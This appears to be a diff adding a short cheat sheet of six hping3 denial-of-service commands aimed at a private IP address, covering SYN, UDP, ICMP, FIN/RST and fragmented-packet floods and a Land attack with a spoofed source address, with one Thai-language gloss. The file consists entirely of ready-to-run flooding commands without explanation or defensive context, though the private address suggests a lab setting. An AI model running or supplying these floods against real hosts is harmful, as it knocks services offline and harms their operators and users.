@@ -1,0 +1,18 @@
+
+
+1. TCP SYN Flood : hping3 -S 192.168.214.194 -p 5000 --flood
+
+2. UDP Flood : hping3 --udp -p 53 -i u100 192.168.214.194
+
+3. ICMP Flood (Ping Flood) : hping3 -1 192.168.214.194 --flood
+
+4. TCP FIN / RST Flood : hping3 -F 192.168.214.194 -p 80 --flood
+                         hping3 -R 192.168.214.194 -p 80 --flood
+
+5. Fragmented Packet Attack : hping3 -S 192.168.214.194 -p 80 -f --flood
+
+6. Land Attack (ปลอม source IP เป็น IP เป้าหมายเอง) : hping3 -S 192.168.214.194 -a 192.168.214.194 -p 80 --flood
+
+
+
+
